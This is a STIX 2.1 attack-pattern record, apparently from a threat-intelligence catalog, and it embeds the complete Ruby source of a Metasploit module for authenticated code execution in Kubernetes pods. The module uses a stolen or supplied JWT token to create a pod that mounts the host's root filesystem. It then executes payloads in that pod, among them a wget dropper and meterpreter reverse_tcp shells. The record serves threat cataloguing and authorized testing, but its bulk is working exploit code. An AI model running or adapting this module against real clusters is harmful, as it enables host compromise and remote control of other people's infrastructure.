{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--497ea8d5-d39c-40a7-b178-2d6b163d4d47",
    "created": "2024-08-14T17:04:56.784541Z",
    "modified": "2024-08-14T17:04:56.784546Z",
    "name": "Kubernetes authenticated code execution",
    "description": " Execute a payload within a Kubernetes pod.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/kubernetes/exec.rb",
            "external_id": "exec.rb"
        }
    ],
    "x_code_snippet": "# -*- coding: binary -*-\n\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit\n  Rank = ManualRanking\n\n  include Msf::Exploit::Retry\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::HTTP::Kubernetes\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Kubernetes authenticated code execution',\n        'Description' => %q{\n          Execute a payload within a Kubernetes pod.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'alanfoster',\n          'Spencer McIntyre'\n        ],\n        'References' => [\n        ],\n        'Notes' => {\n          'SideEffects' => [\n            ARTIFACTS_ON_DISK, # the Linux Dropper target uses the command stager which writes to disk\n            CONFIG_CHANGES, # the Kubernetes configuration is changed if a new pod is created\n            IOC_IN_LOGS # a log event is generated if a new pod is created\n          ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SAFE ]\n        },\n        'DefaultOptions' => {\n          'SSL' => true\n        },\n        'Targets' => [\n          [\n            'Interactive WebSocket',\n            {\n              'Arch' => ARCH_CMD,\n              'Platform' => 'unix',\n              'Type' => :nix_stream,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/interact'\n              },\n              'Payload' => {\n                'Compat' => {\n                  'PayloadType' => 'cmd_interact',\n                  'ConnectionType' => 'find'\n                }\n              }\n            }\n          ],\n          [\n            'Unix Command',\n            {\n              'Arch' => ARCH_CMD,\n              'Platform' => 'unix',\n              'Type' => :nix_cmd\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Platform' => 'linux',\n              'Type' => :nix_dropper,\n              'DefaultOptions' => {\n                'CMDSTAGER::FLAVOR' => 'wget',\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Python',\n            {\n              'Arch' => [ARCH_PYTHON],\n              'Platform' => 'python',\n              'Type' => :python,\n              'PAYLOAD' => 'python/meterpreter/reverse_tcp'\n            }\n          ]\n        ],\n        'DisclosureDate' => '2021-10-01',\n        'DefaultTarget' => 0,\n        'Platform' => [ 'linux', 'unix' ],\n        'SessionTypes' => [ 'meterpreter' ]\n      )\n    )\n\n    register_options(\n      [\n        Opt::RHOSTS(nil, false),\n        Opt::RPORT(nil, false),\n        Msf::OptInt.new('SESSION', [ false, 'An optional session to use for configuration' ]),\n        OptString.new('TOKEN', [ false, 'The JWT token' ]),\n        OptString.new('POD', [ false, 'The pod name to execute in' ]),\n        OptString.new('NAMESPACE', [ false, 'The Kubernetes namespace', 'default' ]),\n        OptString.new('SHELL', [true, 'The shell to use for execution', 'sh' ]),\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('PodImage', [ false, 'The image from which to create the pod' ]),\n        OptInt.new('PodReadyTimeout', [ false, 'The maximum amount time to wait for the pod to be created', 40 ]),\n      ]\n    )\n  end\n\n  def pod_name\n    @pod_name || datastore['POD']\n  end\n\n  def create_pod\n    if datastore['PodImage'].blank?\n      image_names = @kubernetes_client.list_pods(namespace).fetch(:items, []).flat_map { |pod| pod.dig(:spec, :containers).map { |container| container[:image] } }.uniq\n      fail_with(Failure::NotFound, 'An image could not be found from which to create a pod, set the PodImage option') if image_names.empty?\n    else\n      image_names = [ datastore['PodImage'] ]\n    end\n\n    ready = false\n    image_names.each do |image_name|\n      print_status(\"Using image: #{image_name}\")\n\n      random_identifiers = Rex::RandomIdentifier::Generator.new({\n        first_char_set: Rex::Text::LowerAlpha,\n        char_set: Rex::Text::LowerAlpha + Rex::Text::Numerals\n      })\n      new_pod_definition = {\n        apiVersion: 'v1',\n        kind: 'Pod',\n        metadata: {\n          name: random_identifiers[:pod_name],\n          labels: {}\n        },\n        spec: {\n          containers: [\n            {\n              name: random_identifiers[:container_name],\n              image: image_name,\n              command: ['/bin/sh', '-c', 'exec tail -f /dev/null'],\n              volumeMounts: [\n                {\n                  mountPath: '/host_mnt',\n                  name: random_identifiers[:volume_name]\n                }\n              ]\n            }\n          ],\n          volumes: [\n            {\n              name: random_identifiers[:volume_name],\n              hostPath: {\n                path: '/'\n              }\n            }\n          ]\n        }\n      }\n      new_metadata = @kubernetes_client.create_pod(new_pod_definition, namespace)[:metadata]\n\n      @pod_name = random_identifiers[:pod_name]\n      print_good(\"Pod created: #{pod_name}\")\n\n      print_status('Waiting for the pod to be ready...')\n      ready = retry_until_truthy(timeout: datastore['PodReadyTimeout']) do\n        pod = @kubernetes_client.get_pod(pod_name, namespace)\n        pod_status = pod[:status]\n        next if pod_status == 'Failure'\n\n        container_statuses = pod_status[:containerStatuses]\n        next unless container_statuses\n\n        ready = container_statuses.any? { |status| status[:ready] }\n        ready\n      rescue Msf::Exploit::Remote::HTTP::Kubernetes::Error::ServerError => e\n        elog(e)\n        false\n      end\n\n      if ready\n        report_note(\n          type: 'kubernetes.pod',\n          host: rhost,\n          port: rport,\n          data: {\n            pod: new_metadata.slice(:name, :namespace, :uid, :creationTimestamp),\n            imageName: image_name\n          },\n          update: :unique_data\n        )\n\n        break\n      end\n\n      print_error('The pod failed to start within the expected timeframe')\n\n      begin\n        @kubernetes_client.delete_pod(@pod_name, namespace)\n      rescue StandardError\n        print_error('Failed to delete the pod')\n      end\n    end\n\n    fail_with(Failure::Unknown, 'Failed to create a new pod') unless ready\n  end\n\n  def exploit\n    if session\n      print_status(\"Routing traffic through session: #{session.sid}\")\n      configure_via_session\n    end\n\n    validate_configuration!\n\n    @kubernetes_client = Msf::Exploit::Remote::HTTP::Kubernetes::Client.new({ http_client: self, token: api_token })\n\n    create_pod if pod_name.blank?\n\n    case target['Type']\n    when :nix_stream\n      # Setting tty => true allows the shell prompt to be seen but it also causes commands to be echoed back\n      websocket = @kubernetes_client.exec_pod(\n        pod_name,\n        datastore['Namespace'],\n        datastore['Shell'],\n        'stdin' => true,\n        'stdout' => true,\n        'stderr' => true,\n        'tty' => false\n      )\n\n      print_good('Successfully established the WebSocket')\n      channel = Msf::Exploit::Remote::HTTP::Kubernetes::Client::ExecChannel.new(websocket)\n      handler(channel.lsock)\n    when :nix_cmd\n      execute_command(payload.encoded)\n    when :nix_dropper\n      execute_cmdstager\n    else\n      execute_command(payload.encoded)\n    end\n  rescue Rex::Proto::Http::WebSocket::ConnectionError => e\n    res = e.http_response\n    fail_with(Failure::Unreachable, e.message) if res.nil?\n    fail_with(Failure::NoAccess, 'Insufficient Kubernetes access') if res.code == 401 || res.code == 403\n    fail_with(Failure::Unknown, e.message)\n  else\n    report_service(host: rhost, port: rport, proto: 'tcp', name: 'kubernetes')\n  end\n\n  def execute_command(cmd, _opts = {})\n    case target['Platform']\n    when 'python'\n      command = [datastore['Shell'], '-c', \"exec $(which python || which python3 || which python2) -c #{Shellwords.escape(cmd)}\"]\n    else\n      command = [datastore['Shell'], '-c', cmd]\n    end\n\n    result = @kubernetes_client.exec_pod_capture(\n      pod_name,\n      datastore['Namespace'],\n      command,\n      'stdin' => false,\n      'stdout' => true,\n      'stderr' => true,\n      'tty' => false\n    ) do |stdout, stderr|\n      print_line(stdout.strip) unless stdout.blank?\n      print_line(stderr.strip) unless stderr.blank?\n    end\n\n    fail_with(Failure::Unknown, 'Failed to execute the command') if result.nil?\n\n    status = result&.dig(:error, 'status')\n    fail_with(Failure::Unknown, \"Status: #{status || 'Unknown'}\") unless status == 'Success'\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-10-01",
    "x_mitre_platforms": [
        "[ 'linux', 'unix' ]"
    ]
}